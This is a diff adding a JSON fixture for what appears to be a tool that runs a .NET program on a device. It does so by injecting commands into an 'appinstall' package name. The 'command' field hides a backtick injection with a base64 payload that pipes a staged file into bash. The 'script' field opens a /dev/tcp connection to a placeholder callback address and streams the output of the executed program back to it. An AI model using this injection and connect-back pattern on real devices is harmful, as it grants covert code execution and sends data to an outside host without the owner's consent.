@@ -1,0 +1,31 @@
+{
+  "files": [
+    {
+      "name": "Query.dll",
+      "data_hex": "646c6c"
+    },
+    {
+      "name": "Query.runtimeconfig.json",
+      "data_hex": "7b7d"
+    },
+    {
+      "name": "request.json",
+      "data_hex": "7b7d"
+    }
+  ],
+  "entrypoint": "Query.dll",
+  "args": [
+    "request.json"
+  ],
+  "callback": "192.0.2.1",
+  "port": 5678,
+  "token": "aaaaaaaaaaaa",
+  "script": "set -u\numask 077\ntrap 'rm -f /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa.s /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa.r /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.dll /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.runtimeconfig.json /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-request.json' EXIT\nexec 3<>/dev/tcp/192.0.2.1/5678 || exit 80\n(\nset -eu\ntest \"$(id -u)\" = 901\nif [ ! -x /usr/bin/dotnet ]; then\n  printf '%s\\n' AEROTIZEN_SDK_DOTNET_UNAVAILABLE\n  exit 127\nfi\nprintf '%s  %s\\n' 0343b13708cd52d33ecbb1043b5ae145e73a532bdccf7de6925db5cce6054fd3 /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.dll | sha256sum -c - >/dev/null\nprintf '%s  %s\\n' 44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.runtimeconfig.json | sha256sum -c - >/dev/null\nprintf '%s  %s\\n' 44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-request.json | sha256sum -c - >/dev/null\n/usr/bin/dotnet /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.dll /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-request.json\n) >&3 2>&3\nresult=$?\nrm -f /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa.s /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa.r /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.dll /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.runtimeconfig.json /home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-request.json || exit 81\nprintf '\\nAEROTIZEN_SDK_CLEANED\\nAEROTIZEN_SDK_EXIT=%s\\n' \"$result\" >&3\nexec 3>&-\nexit \"$result\"\n",
+  "command": "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}L2Jpbi9tdiAvaG9tZS9vd25lci9zaGFyZS90bXAvc2RrX3Rvb2xzL2FoLWFhYWFhYWFhYWFhYS5zIC9ob21lL293bmVyL3NoYXJlL3RtcC9zZGtfdG9vbHMvYWgtYWFhYWFhYWFhYWFhLnIgMj4vZGV2L251bGwmJi9iaW4vY2F0IC9ob21lL293bmVyL3NoYXJlL3RtcC9zZGtfdG9vbHMvYWgtYWFhYWFhYWFhYWFhLnJ8L2Jpbi9iYXNo|base64${IFS}-d|bash`.tpk",
+  "stage": "/home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa.s",
+  "paths": {
+    "Query.dll": "/home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.dll",
+    "Query.runtimeconfig.json": "/home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-Query.runtimeconfig.json",
+    "request.json": "/home/owner/share/tmp/sdk_tools/ah-aaaaaaaaaaaa-request.json"
+  }
+}
